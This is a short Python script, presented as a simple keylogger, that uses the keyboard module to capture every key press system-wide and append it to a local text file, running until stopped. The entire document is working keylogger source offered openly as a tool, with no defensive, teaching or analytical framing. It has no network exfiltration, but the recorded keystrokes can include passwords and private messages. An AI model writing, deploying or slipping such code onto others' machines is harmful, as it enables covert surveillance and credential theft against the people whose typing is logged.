"A simple keylogger using the keyboard module in python"
# v 1.0 



import keyboard 

# function to write the key stores into an output file 
def storedata(data):
    with open("KEYLOGGEROUTPUT.txt","a") as file:
        file.write(data)

# To get the character 
def words(char):
    if char == "space":
        return " "
    elif len(char)> 1:
        return "[%s]" % char
    else:
        return char 

# record the event 
def wordrecord(event):
    storedata(words(event.name));

# record the event using the keyboard module 
keyboard.on_press(wordrecord)

# sleep 
keyboard.wait()
